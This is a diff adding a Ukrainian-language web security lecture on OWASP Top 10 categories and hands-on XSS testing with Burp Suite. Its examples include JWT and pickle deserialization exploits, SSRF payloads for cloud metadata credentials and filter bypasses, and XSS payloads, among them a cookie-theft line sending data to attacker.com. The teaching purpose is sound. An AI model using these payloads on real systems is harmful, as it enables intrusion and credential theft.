+          <li>Не вимагати спеціальних символів, великих літер тощо</li>
+          <li>Перевіряти у базах скомпрометованих паролів</li>
+          <li>Не вимагати періодичної зміни без причини</li>
+          <li>Підтримувати paste у полях паролів (для менеджерів паролів)</li>
+        </ul>
+
+        <p><strong>4. Вразливості сесій:</strong></p>
+        <table>
+          <tr>
+            <th>Вразливість</th>
+            <th>Опис</th>
+            <th>Захист</th>
+          </tr>
+          <tr>
+            <td><strong>Session Fixation</strong></td>
+            <td>Зловмисник встановлює session ID до логіну жертви</td>
+            <td>Генерувати новий session ID після логіну</td>
+          </tr>
+          <tr>
+            <td><strong>Session Hijacking</strong></td>
+            <td>Перехоплення session ID (мережа, XSS)</td>
+            <td>HttpOnly, Secure, TLS, прив'язка до IP/UA</td>
+          </tr>
+          <tr>
+            <td><strong>Predictable IDs</strong></td>
+            <td>Послідовні або слабко рандомні ідентифікатори</td>
+            <td>CSPRNG (crypto.randomBytes)</td>
+          </tr>
+          <tr>
+            <td><strong>No expiration</strong></td>
+            <td>Сесії ніколи не закінчуються</td>
+            <td>Absolute та idle timeout</td>
+          </tr>
+          <tr>
+            <td><strong>Insecure logout</strong></td>
+            <td>Сесія не інвалідується при виході</td>
+            <td>Server-side session invalidation</td>
+          </tr>
+        </table>
+
+        <p><strong>5. OAuth 2.0 та OpenID Connect — вразливості:</strong></p>
+        <ul>
+          <li><strong>Open Redirect</strong> — маніпуляція <code>redirect_uri</code> для перехоплення authorization code</li>
+          <li><strong>CSRF на callback</strong> — відсутній <code>state</code> параметр</li>
+          <li><strong>Token leakage</strong> — access_token у URL fragment або Referer</li>
+          <li><strong>Implicit flow</strong> — токен у URL, вразливий до витоку (deprecated у OAuth 2.1)</li>
+          <li><strong>PKCE bypass</strong> — відсутність code_verifier при Authorization Code flow</li>
+        </ul>
+
+        <p><strong>6. JWT (JSON Web Token) вразливості:</strong></p>
+        <pre><code>// JWT structure: header.payload.signature
+// eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature
+
+// Атака: alg=none
+{"alg": "none", "typ": "JWT"}  // Підпис не перевіряється
+
+// Атака: RS256 → HS256 confusion
+// Сервер очікує RS256 (asymmetric), зловмисник підписує HS256
+// використовуючи публічний ключ як HMAC secret
+
+// Атака: Weak secret
+hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+
+// Захист: перевіряти alg, використовувати strong secret (256-bit+),
+// встановлювати exp, валідувати на сервері</code></pre>
+
+        <h3>Запобігання</h3>
+        <ul>
+          <li><strong>MFA для всіх критичних операцій</strong> — логін, зміна паролю, фінансові транзакції</li>
+          <li><strong>Rate limiting</strong> — обмеження спроб логіну (5-10 за 15 хвилин)</li>
+          <li><strong>Account lockout</strong> — тимчасове блокування після N невдалих спроб</li>
+          <li><strong>Безпечне зберігання паролів</strong> — bcrypt, Argon2, scrypt з salt</li>
+          <li><strong>Secure session management</strong> — CSPRNG, timeout, server-side invalidation</li>
+          <li><strong>Password managers</strong> — підтримка автозаповнення, paste у полях</li>
+          <li><strong>Passkeys / WebAuthn</strong> — безпарольна автентифікація (FIDO2)</li>
+        </ul>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 8.5 A08: Порушення цілісності ПЗ та даних                    -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>8.5 A08: Порушення цілісності програмного забезпечення та даних (Software and Data Integrity Failures)</h2>
+
+        <p>Нова категорія в OWASP Top 10:2021 (раніше частково A08:2017 — Insecure Deserialization). Охоплює ситуації, коли код та інфраструктура не захищені від порушення цілісності: ненадійні оновлення, небезпечна десеріалізація, скомпрометовані CI/CD-пайплайни.</p>
+
+        <h3>Небезпечна десеріалізація (Insecure Deserialization)</h3>
+
+        <p>Серіалізація — перетворення об'єкта у формат для збереження/передачі (JSON, XML, бінарний). Десеріалізація — зворотний процес. Якщо додаток десеріалізує ненадійні дані без валідації, зловмисник може маніпулювати об'єктами для:</p>
+        <ul>
+          <li><strong>Remote Code Execution (RCE)</strong> — виконання довільного коду</li>
+          <li><strong>Privilege Escalation</strong> — зміна ролі/привілеїв об'єкта</li>
+          <li><strong>Denial of Service</strong> — створення об'єктів, що споживають ресурси</li>
+          <li><strong>Authentication Bypass</strong> — маніпуляція серіалізованою сесією</li>
+        </ul>
+
+        <p><strong>Приклад — PHP Object Injection:</strong></p>
+        <pre><code>// Вразливий код
+$user = unserialize($_COOKIE['user_data']);
+
+// Зловмисний payload — використовує magic method __destruct()
+// або __wakeup() для виконання коду
+O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
+
+// Захист: НІКОЛИ не десеріалізувати ненадійні дані
+// Використовувати json_decode() замість unserialize()</code></pre>
+
+        <p><strong>Приклад — Java Deserialization (Apache Commons Collections):</strong></p>
+        <pre><code># Генерація payload за допомогою ysoserial
+java -jar ysoserial.jar CommonsCollections1 "id" | base64
+
+# Payload надсилається через будь-який канал, де
+# додаток десеріалізує Java-об'єкти:
+# - RMI (Remote Method Invocation)
+# - JMX (Java Management Extensions)
+# - Custom protocols (бінарні API)
+# - HTTP parameters/cookies з серіалізованими об'єктами
+
+# Захист: ObjectInputFilter (Java 9+), не десеріалізувати
+# ненадійні дані, використовувати JSON/protobuf</code></pre>
+
+        <p><strong>Приклад — Python pickle:</strong></p>
+        <pre><code>import pickle
+import os
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('id',))
+
+# Серіалізація шкідливого об'єкта
+payload = pickle.dumps(Exploit())
+
+# Якщо сервер десеріалізує:
+pickle.loads(payload)  # Виконає os.system('id')
+
+# Захист: НІКОЛИ не використовувати pickle з ненадійними даними
+# Альтернативи: json, msgpack, protobuf</code></pre>
+
+        <h3>Цілісність CI/CD-пайплайнів</h3>
+
+        <p>CI/CD-системи мають привілейований доступ до коду, секретів та продакшн-середовищ. Їх компрометація дозволяє впровадити шкідливий код у будь-який етап розробки:</p>
+
+        <table>
+          <tr>
+            <th>Вектор атаки</th>
+            <th>Опис</th>
+            <th>Приклад</th>
+          </tr>
+          <tr>
+            <td><strong>Poisoned Pipeline Execution</strong></td>
+            <td>Маніпуляція конфігурацією CI/CD через PR</td>
+            <td>Зміна .github/workflows для ексфільтрації секретів</td>
+          </tr>
+          <tr>
+            <td><strong>Dependency Confusion</strong></td>
+            <td>Публікація пакету з ім'ям внутрішнього у public registry</td>
+            <td>Атака на Microsoft, Apple, PayPal (2021)</td>
+          </tr>
+          <tr>
+            <td><strong>Typosquatting</strong></td>
+            <td>Пакет з схожою назвою (crypt0graphy замість cryptography)</td>
+            <td>npm, PyPI регулярні інциденти</td>
+          </tr>
+          <tr>
+            <td><strong>Compromised Maintainer</strong></td>
+            <td>Отримання доступу до акаунту мейнтейнера</td>
+            <td>event-stream (npm), ua-parser-js</td>
+          </tr>
+          <tr>
+            <td><strong>Build System Compromise</strong></td>
+            <td>Атака на систему збірки</td>
+            <td>SolarWinds (2020), Codecov (2021)</td>
+          </tr>
+        </table>
+
+        <h3>Subresource Integrity (SRI)</h3>
+
+        <p>SRI дозволяє браузеру перевірити, що завантажений зовнішній ресурс (JS, CSS) не був модифікований:</p>
+        <pre><code>&lt;!-- Без SRI — ризик: CDN compromise → шкідливий код --&gt;
+&lt;script src="https://cdn.example.com/lib.js"&gt;&lt;/script&gt;
+
+&lt;!-- З SRI — браузер перевіряє hash перед виконанням --&gt;
+&lt;script src="https://cdn.example.com/lib.js"
+  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"
+  crossorigin="anonymous"&gt;&lt;/script&gt;
+
+&lt;!-- Генерація hash --&gt;
+# openssl dgst -sha384 -binary lib.js | openssl base64 -A
+# або: shasum -b -a 384 lib.js | xxd -r -p | base64</code></pre>
+
+        <h3>Запобігання</h3>
+        <ul>
+          <li><strong>Цифрові підписи</strong> — перевіряти підписи оновлень, пакетів, артефактів</li>
+          <li><strong>SRI</strong> — для всіх зовнішніх скриптів і стилів</li>
+          <li><strong>Lock-файли + hash verification</strong> — <code>npm ci</code> (замість <code>npm install</code>)</li>
+          <li><strong>SLSA framework</strong> (Supply-chain Levels for Software Artifacts) — рівні забезпечення цілісності ланцюга поставок</li>
+          <li><strong>Code review</strong> — перегляд усіх змін, включаючи залежності та CI/CD конфігурацію</li>
+          <li><strong>Не десеріалізувати ненадійні дані</strong> — використовувати JSON, protobuf замість бінарної серіалізації</li>
+          <li><strong>Sigstore / cosign</strong> — підписування та верифікація контейнерів та артефактів</li>
+        </ul>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 8.6 A09: Недоліки журналювання та моніторингу                 -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>8.6 A09: Недоліки журналювання та моніторингу безпеки (Security Logging and Monitoring Failures)</h2>
+
+        <p>Без належного логування та моніторингу атаки залишаються непоміченими. За даними IBM Cost of a Data Breach Report 2024, середній час виявлення витоку становить <strong>194 дні</strong>, а середній час на стримування — ще <strong>64 дні</strong>. Організації з розвиненим SIEM та SOC виявляють інциденти на <strong>108 днів</strong> швидше.</p>
+
+        <h3>Що потрібно логувати</h3>
+        <table>
+          <tr>
+            <th>Категорія</th>
+            <th>Події</th>
+            <th>Деталі</th>
+          </tr>
+          <tr>
+            <td><strong>Автентифікація</strong></td>
+            <td>Логін, логаут, невдалі спроби</td>
+            <td>Username, IP, User-Agent, timestamp, результат</td>
+          </tr>
+          <tr>
+            <td><strong>Авторизація</strong></td>
+            <td>Відмова в доступі, зміна привілеїв</td>
+            <td>Ресурс, дія, користувач, причина відмови</td>
+          </tr>
+          <tr>
+            <td><strong>Введення даних</strong></td>
+            <td>Помилки валідації, підозрілі паттерни</td>
+            <td>Тип помилки, параметр (не значення!)</td>
+          </tr>
+          <tr>
+            <td><strong>Бізнес-логіка</strong></td>
+            <td>Аномальні операції, ліміти</td>
+            <td>Сума, кількість, частота</td>
+          </tr>
+          <tr>
+            <td><strong>Системні</strong></td>
+            <td>Старт/зупинка, помилки, зміни конфігурації</td>
+            <td>Процес, версія, параметри</td>
+          </tr>
+        </table>
+
+        <h3>Чого НЕ логувати</h3>
+        <ul>
+          <li><strong>Паролі</strong> — навіть хешовані</li>
+          <li><strong>Токени доступу</strong> — session ID, API keys, JWT</li>
+          <li><strong>PII без необхідності</strong> — номери карток, SSN</li>
+          <li><strong>Медичні дані</strong> — HIPAA compliance</li>
+          <li>Якщо потрібно логувати чутливі дані — <strong>маскування</strong>: <code>****-****-****-1234</code></li>
+        </ul>
+
+        <h3>Формат логів</h3>
+        <pre><code>// Структурований формат (JSON) — рекомендований
+{
+  "timestamp": "2024-03-15T14:23:01.456Z",
+  "level": "WARN",
+  "event": "authentication.failed",
+  "source_ip": "192.168.1.100",
+  "username": "admin",
+  "user_agent": "Mozilla/5.0...",
+  "reason": "invalid_password",
+  "attempt_count": 5,
+  "request_id": "req-abc123",
+  "geo": "UA/Kyiv"
+}
+
+// Common Log Format (Apache) — legacy
+192.168.1.100 - admin [15/Mar/2024:14:23:01 +0000] "POST /login HTTP/1.1" 401 1234</code></pre>
+
+        <h3>SIEM (Security Information and Event Management)</h3>
+
+        <p>SIEM-системи агрегують логи з усіх джерел, кореляють події та генерують алерти:</p>
+
+        <table>
+          <tr>
+            <th>SIEM</th>
+            <th>Тип</th>
+            <th>Особливості</th>
+          </tr>
+          <tr>
+            <td><strong>Splunk</strong></td>
+            <td>Комерційний</td>
+            <td>Лідер ринку, потужний пошук (SPL), дорогий</td>
+          </tr>
+          <tr>
+            <td><strong>Elastic SIEM</strong></td>
+            <td>OSS + комерційний</td>
+            <td>ELK Stack (Elasticsearch, Logstash, Kibana)</td>
+          </tr>
+          <tr>
+            <td><strong>Wazuh</strong></td>
+            <td>Open Source</td>
+            <td>HIDS + SIEM, інтеграція з ELK</td>
+          </tr>
+          <tr>
+            <td><strong>Microsoft Sentinel</strong></td>
+            <td>Cloud (Azure)</td>
+            <td>KQL-запити, AI-powered, інтеграція з Microsoft 365</td>
+          </tr>
+          <tr>
+            <td><strong>Google Chronicle</strong></td>
+            <td>Cloud (GCP)</td>
+            <td>Петабайти даних, YARA-L rules</td>
+          </tr>
+          <tr>
+            <td><strong>Graylog</strong></td>
+            <td>OSS + комерційний</td>
+            <td>Легкий у налаштуванні, pipelines</td>
+          </tr>
+        </table>
+
+        <h3>Алертинг та реагування</h3>
+
+        <p><strong>Типові правила алертингу:</strong></p>
+        <ul>
+          <li>Більше 5 невдалих логінів за 5 хвилин з одного IP → можливий brute force</li>
+          <li>Логін з нової геолокації → підозрілий доступ</li>
+          <li>SQL-помилки у логах → можлива SQL Injection</li>
+          <li>Сплеск 4xx/5xx помилок → сканування або атака</li>
+          <li>Доступ до admin-панелі з зовнішнього IP → несанкціонований доступ</li>
+          <li>Зміна конфігурації поза робочими годинами → можлива компрометація</li>
+        </ul>
+
+        <p><strong>Incident Response план:</strong></p>
+        <ol>
+          <li><strong>Detection</strong> — виявлення інциденту через алерти або ручний аналіз</li>
+          <li><strong>Triage</strong> — оцінка серйозності та масштабу</li>
+          <li><strong>Containment</strong> — стримування (ізоляція системи, блокування IP)</li>
+          <li><strong>Eradication</strong> — видалення загрози (патчинг, зміна credentials)</li>
+          <li><strong>Recovery</strong> — відновлення нормальної роботи</li>
+          <li><strong>Lessons Learned</strong> — post-mortem, покращення захисту</li>
+        </ol>
+
+        <h3>Запобігання</h3>
+        <ul>
+          <li><strong>Централізоване логування</strong> — всі логи в одному місці (SIEM)</li>
+          <li><strong>Структуровані логи</strong> — JSON-формат для автоматичного парсингу</li>
+          <li><strong>Достатній рівень деталізації</strong> — хто, що, коли, звідки, результат</li>
+          <li><strong>Захист логів від підробки</strong> — append-only storage, окремий сервер</li>
+          <li><strong>Моніторинг та алертинг</strong> — автоматичні повідомлення про підозрілі події</li>
+          <li><strong>Retention policy</strong> — зберігання логів мінімум 90 днів (рекомендовано 1 рік)</li>
+          <li><strong>Тестування</strong> — регулярна перевірка, що алерти спрацьовують (Purple Team)</li>
+        </ul>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 8.7 A10: SSRF                                                -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>8.7 A10: Підробка запитів на стороні сервера (Server-Side Request Forgery — SSRF)</h2>
+
+        <p>SSRF — вразливість, що дозволяє зловмиснику змусити сервер виконати HTTP-запит до довільного ресурсу, обходячи мережеві обмеження (firewall, ACL). Нова категорія в OWASP Top 10:2021, додана за результатами опитування спільноти як топ-ризик, що зростає.</p>
+
+        <p>SSRF особливо небезпечна у хмарних середовищах, де внутрішні метадані-сервіси (169.254.169.254) доступні з будь-якого інстанса.</p>
+
+        <h3>Типи SSRF</h3>
+
+        <p><strong>1. Basic SSRF (з відповіддю):</strong></p>
+        <p>Зловмисник бачить відповідь від внутрішнього ресурсу:</p>
+        <pre><code>// Вразливий код — завантаження зображення за URL
+app.get('/fetch', async (req, res) =&gt; {
+  const response = await fetch(req.query.url);
+  const data = await response.text();
+  res.send(data);
+});
+
+// Легітимний запит
+GET /fetch?url=https://example.com/image.jpg
+
+// SSRF атака — читання внутрішнього ресурсу
+GET /fetch?url=http://localhost:8080/admin
+GET /fetch?url=http://192.168.1.1/config
+GET /fetch?url=file:///etc/passwd</code></pre>
+
+        <p><strong>2. Blind SSRF (без відповіді):</strong></p>
+        <p>Відповідь не повертається зловмиснику, але запит виконується. Визначається через:</p>
+        <ul>
+          <li><strong>Timing</strong> — різниця у часі відповіді для існуючих/неіснуючих хостів</li>
+          <li><strong>Out-of-Band</strong> — DNS-запит до контрольованого сервера (Burp Collaborator)</li>
+          <li><strong>Error-based</strong> — різні помилки для різних ресурсів</li>
+        </ul>
+
+        <h3>Вектори атаки через SSRF</h3>
+
+        <p><strong>1. Хмарні метадані:</strong></p>
+        <pre><code># AWS Instance Metadata Service (IMDSv1)
+GET /fetch?url=http://169.254.169.254/latest/meta-data/
+GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
+# Повертає: AccessKeyId, SecretAccessKey, Token → повний доступ до AWS
+
+# GCP Metadata
+GET /fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+# Потрібен заголовок: Metadata-Flavor: Google (але SSRF може обійти)
+
+# Azure Metadata
+GET /fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/</code></pre>
+
+        <p><strong>Кейс: Capital One (2019)</strong> — SSRF у WAF (ModSecurity на AWS) дозволила прочитати IAM credentials через metadata endpoint. Результат: витік даних 106 млн клієнтів. Штраф: $80 млн.</p>
+
+        <p><strong>2. Сканування внутрішньої мережі:</strong></p>
+        <pre><code># Сканування портів
+GET /fetch?url=http://192.168.1.1:22    → SSH
+GET /fetch?url=http://192.168.1.1:3306  → MySQL
+GET /fetch?url=http://192.168.1.1:6379  → Redis
+GET /fetch?url=http://192.168.1.1:9200  → Elasticsearch
+
+# Доступ до внутрішніх сервісів
+GET /fetch?url=http://internal-jenkins:8080
+GET /fetch?url=http://grafana.internal:3000
+GET /fetch?url=http://kubernetes.default.svc/api/v1/namespaces</code></pre>
+
+        <p><strong>3. Протокольні атаки:</strong></p>
+        <pre><code># File protocol
+GET /fetch?url=file:///etc/passwd
+GET /fetch?url=file:///proc/self/environ  → environment variables
+
+# Gopher protocol (якщо підтримується)
+# Дозволяє надсилати довільні TCP-пакети
+GET /fetch?url=gopher://127.0.0.1:6379/_SET%20key%20"malicious"
+
+# Dict protocol
+GET /fetch?url=dict://127.0.0.1:6379/info</code></pre>
+
+        <h3>Обхід фільтрів SSRF</h3>
+        <pre><code># Обхід блокування "localhost" / "127.0.0.1"
+http://127.1
+http://0x7f000001
+http://2130706433     (decimal)
+http://017700000001   (octal)
+http://[::1]          (IPv6)
+http://0.0.0.0
+http://localtest.me   (DNS resolves to 127.0.0.1)
+http://spoofed.burpcollaborator.net  (DNS rebinding)
+
+# Обхід блокування "169.254.169.254"
+http://[::ffff:169.254.169.254]
+http://169.254.169.254.nip.io
+http://2852039166    (decimal)
+http://0xA9FEA9FE   (hex)
+
+# URL parsing tricks
+http://evil.com@169.254.169.254
+http://169.254.169.254#@allowed-domain.com
+http://169.254.169.254%23@allowed-domain.com
+
+# Редиректи
+# Зловмисник контролює evil.com, який робить 302 redirect на 169.254.169.254
+GET /fetch?url=https://evil.com/redirect</code></pre>
+
+        <h3>Захист від SSRF</h3>
+
+        <p><strong>1. Network-level:</strong></p>
+        <ul>
+          <li><strong>IMDSv2</strong> (AWS) — вимагає PUT-запит для отримання токена, блокує більшість SSRF</li>
+          <li><strong>Firewall rules</strong> — блокувати вихідні з'єднання до internal/metadata мереж</li>
+          <li><strong>Network segmentation</strong> — ізоляція сервісів у окремих мережах</li>
+        </ul>
+
+        <p><strong>2. Application-level:</strong></p>
+        <pre><code>// Allowlist підхід (рекомендований)
+const allowedDomains = ['api.example.com', 'cdn.example.com'];
+
+function isAllowed(url) {
+  const parsed = new URL(url);
+  return allowedDomains.includes(parsed.hostname)
+    &amp;&amp; ['http:', 'https:'].includes(parsed.protocol);
+}
+
+// Denylist підхід (менш надійний, легко обійти)
+function isDenied(url) {
+  const parsed = new URL(url);
+  const ip = await dns.resolve(parsed.hostname);
+  return isPrivateIP(ip) || isLoopback(ip) || isLinkLocal(ip);
+}
+
+// DNS resolution check (захист від DNS rebinding)
+function safeFetch(url) {
+  const parsed = new URL(url);
+  const ip = await dns.resolve(parsed.hostname);
+  if (isPrivateIP(ip)) throw new Error('Blocked');
+  // Використовувати resolved IP, а не hostname
+  return fetch(url, { headers: { Host: parsed.hostname } });
+}</code></pre>
+
+        <ul>
+          <li><strong>Allowlist</strong> — дозволяти тільки перевірені домени/IP</li>
+          <li><strong>Блокувати приватні діапазони</strong> — 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, 127.0.0.0/8</li>
+          <li><strong>Блокувати небезпечні протоколи</strong> — file://, gopher://, dict://, ftp://</li>
+          <li><strong>Disable redirects</strong> — або перевіряти кожен redirect</li>
+          <li><strong>DNS resolution перед запитом</strong> — захист від DNS rebinding</li>
+        </ul>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 8.8 Практика: XSS-тестування з Burp Suite                   -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>8.8 Практика: XSS-тестування з Burp Suite</h2>
+
+        <p>Burp Suite — основний інструмент для ручного тестування веб-безпеки. У цьому розділі ми розглянемо практичний workflow виявлення та експлуатації XSS-вразливостей за допомогою Burp Suite та його розширення DOM Invader.</p>
+
+        <h3>Підготовка середовища</h3>
+        <ol>
+          <li><strong>Запустити Burp Suite</strong> (Community або Professional)</li>
+          <li><strong>Налаштувати Proxy</strong> — за замовчуванням слухає на <code>127.0.0.1:8080</code></li>
+          <li><strong>Налаштувати браузер</strong> — Burp's embedded browser або FoxyProxy для Firefox</li>
+          <li><strong>Встановити CA-сертифікат Burp</strong> — для перехоплення HTTPS: <code>http://burp/cert</code></li>
+          <li><strong>Запустити DVWA</strong> (Damn Vulnerable Web Application) або PortSwigger Web Security Academy</li>
+        </ol>
+
+        <h3>Крок 1: Mapping (збір поверхні атаки)</h3>
+        <pre><code># Target → Site map — автоматична побудова карти сайту
+# Proxy → HTTP history — перегляд усіх запитів
+
+1. Пройдіть по всіх сторінках додатку
+2. Заповніть усі форми тестовими даними
+3. Використайте унікальний маркер для кожного поля:
+   test123xss, test456xss, test789xss
+4. У Site map знайдіть усі точки, де введені дані відображаються
+5. Зверніть увагу на:
+   - Пошукові поля
+   - Коментарі / відгуки
+   - Профілі користувачів
+   - URL-параметри, що відображаються на сторінці
+   - Повідомлення про помилки</code></pre>
+
+        <h3>Крок 2: Пошук Reflected XSS з Burp Repeater</h3>
+        <pre><code># 1. Перехопіть запит з параметром у Proxy
+# 2. Надішліть у Repeater (Ctrl+R)
+# 3. Вставте тестовий payload:
+
+GET /search?q=test123xss HTTP/1.1
+Host: target.com
+
+# Перевірте відповідь:
+# - Чи відображається test123xss без змін?
+# - У якому контексті? (HTML body, attribute, JS, URL)
+
+# 4. Спробуйте базовий XSS:
+GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1
+
+# 5. Якщо заблокований — визначте, що фільтрується:
+GET /search?q=&lt;img src=x onerror=alert(1)&gt; HTTP/1.1
+GET /search?q="onmouseover="alert(1) HTTP/1.1
+GET /search?q=&lt;svg/onload=alert(1)&gt; HTTP/1.1
+
+# 6. Аналізуйте Response у вкладці Render для візуалізації</code></pre>
+
+        <h3>Крок 3: Тестування Stored XSS</h3>
+        <pre><code># 1. Знайдіть форму, що зберігає дані (коментарі, профіль)
+# 2. Введіть payload:
+   Ім'я: &lt;script&gt;alert('stored')&lt;/script&gt;
+   Коментар: &lt;img src=x onerror=alert(document.domain)&gt;
+
+# 3. Перейдіть на сторінку, де відображаються дані
+# 4. Перевірте, чи спрацював payload
+# 5. Якщо фільтрується — спробуйте обхідні техніки:
+   &lt;details open ontoggle=alert(1)&gt;test&lt;/details&gt;
+   &lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x&gt;
+
+# Важливо: для Stored XSS перевірте ВСІ місця,
+# де дані можуть відображатися (admin panel, email, PDF export)</code></pre>
+
+        <h3>Крок 4: DOM XSS з DOM Invader</h3>
+
+        <p>DOM Invader — вбудоване розширення Burp Suite для автоматизації пошуку DOM XSS:</p>
+
+        <ol>
+          <li>Відкрийте вбудований браузер Burp Suite</li>
+          <li>Увімкніть DOM Invader: Extension icon → DOM Invader → On</li>
+          <li>Включіть <strong>"Inject canary into sources"</strong></li>
+          <li>DOM Invader автоматично відстежує, як canary-рядок проходить через DOM sources → sinks</li>
+          <li>Перегляньте результати у DevTools → DOM Invader tab</li>
+          <li>Натисніть <strong>"Exploit"</strong> для автоматичної генерації payload</li>
+        </ol>
+
+        <pre><code># Ручний пошук DOM XSS:
+# 1. Відкрийте DevTools (F12) → Console
+# 2. Шукайте небезпечні sink'и у коді:
+
+# Пошук innerHTML
+document.querySelectorAll('script').forEach(s =&gt;
+  console.log(s.textContent.match(/innerHTML|outerHTML|document\.write|eval\(/g))
+);
+
+# 3. Тестуйте hash-based payload'и:
+https://target.com/page#&lt;img src=x onerror=alert(1)&gt;
+
+# 4. Тестуйте postMessage handler'и:
+# У Console:
+window.postMessage('&lt;img src=x onerror=alert(1)&gt;', '*')</code></pre>
+
+        <h3>Крок 5: Автоматизація з Burp Intruder</h3>
+        <pre><code># 1. Надішліть запит в Intruder (Ctrl+I)
+# 2. Позначте параметр як Payload Position:
+   GET /search?q=§test§ HTTP/1.1
+
+# 3. Payload type: Simple list
+# 4. Завантажте XSS payload list:
+   - PortSwigger XSS cheat sheet payloads
+   - PayloadsAllTheThings/XSS Injection/
+   - /usr/share/seclists/Fuzzing/XSS/
+
+# 5. Grep → Match → додайте маркери:
+   alert(  → для підтвердження виконання
+   onerror= → для event handler payload'ів
+   &lt;script → для відображення тегів
+
+# 6. Відфільтруйте результати за наявністю маркерів
+# 7. Перевірте підозрілі відповіді у Render tab</code></pre>
+
+        <h3>Крок 6: Proof of Concept</h3>
+        <pre><code># Після знаходження XSS — створіть PoC для звіту:
+
+# Мінімальний PoC
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+
+# PoC з демонстрацією впливу (cookie theft)
+&lt;script&gt;
+  fetch('https://attacker.com/log?cookie=' + encodeURIComponent(document.cookie))
+&lt;/script&gt;
+
+# PoC через Burp Collaborator (out-of-band)
+&lt;script&gt;
+  fetch('https://COLLABORATOR-ID.burpcollaborator.net?c=' + document.cookie)
+&lt;/script&gt;
+
+# Для звіту вкажіть:
+# 1. Тип XSS (Reflected/Stored/DOM)
+# 2. Вразливий параметр та endpoint
+# 3. Мінімальний payload
+# 4. Кроки відтворення
+# 5. Вплив (що може зробити зловмисник)
+# 6. Рекомендації щодо виправлення</code></pre>
+
+        <h3>OWASP ZAP: альтернатива для автоматичного сканування</h3>
+        <pre><code># Автоматичне сканування XSS з ZAP
+# 1. Запустіть ZAP
+# 2. Quick Start → Automated Scan → URL → Attack
+# 3. Перегляньте результати: Alerts tab → Cross Site Scripting
+
+# ZAP CLI для CI/CD
+docker run -t zaproxy/zap-stable zap-baseline.py \
+  -t https://target.com \
+  -r report.html
+
+# ZAP API для скриптування
+curl "http://localhost:8080/JSON/ascan/action/scan/?url=https://target.com"</code></pre>
+
+        <h3>Корисні ресурси для практики</h3>
+        <table>
+          <tr>
+            <th>Ресурс</th>
+            <th>Тип</th>
+            <th>URL</th>
+          </tr>
+          <tr>
+            <td><strong>PortSwigger Web Security Academy</strong></td>
+            <td>Labs</td>
+            <td>portswigger.net/web-security</td>
+          </tr>
+          <tr>
+            <td><strong>PortSwigger XSS Cheat Sheet</strong></td>
+            <td>Reference</td>
+            <td>portswigger.net/web-security/cross-site-scripting/cheat-sheet</td>
+          </tr>
+          <tr>
+            <td><strong>DVWA</strong></td>
+            <td>Vulnerable App</td>
+            <td>github.com/digininja/DVWA</td>
+          </tr>
+          <tr>
+            <td><strong>XSS Game (Google)</strong></td>
+            <td>CTF</td>
+            <td>xss-game.appspot.com</td>
+          </tr>
+          <tr>
+            <td><strong>HackTheBox</strong></td>
+            <td>Labs</td>
+            <td>hackthebox.com</td>
+          </tr>
+          <tr>
+            <td><strong>TryHackMe</strong></td>
+            <td>Guided Labs</td>
+            <td>tryhackme.com</td>
+          </tr>
+          <tr>
+            <td><strong>PayloadsAllTheThings</strong></td>
+            <td>Payload DB</td>
+            <td>github.com/swisskyrepo/PayloadsAllTheThings</td>
+          </tr>
+        </table>
       </section>
 
     </article>
 
     <div class="lecture-nav-bottom">
-      <a href="../lectures/7.html" class="nav-btn">&larr; Попередня</a>
-      <a href="../lectures/9.html" class="nav-btn">Наступна &rarr;</a>
+      <a href="7.html" class="nav-btn">&larr; Попередня</a>
+      <a href="9.html" class="nav-btn">Наступна &rarr;</a>
     </div>
 
     <footer id="site-footer"></footer>
